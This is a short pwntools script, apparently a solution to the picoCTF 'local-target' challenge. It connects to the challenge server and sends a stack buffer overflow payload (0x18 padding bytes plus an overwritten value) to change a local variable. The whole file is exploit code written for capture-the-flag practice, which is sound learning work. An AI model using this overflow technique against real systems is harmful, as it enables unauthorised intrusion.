from pwn import *

elf = ELF('local-target')
io = remote('saturn.picoctf.net', 53643)
context.binary = elf

payload = b'a' * 0x18
payload += p64(65)

io.sendlineafter('Enter a string: ', payload)

io.interactive()
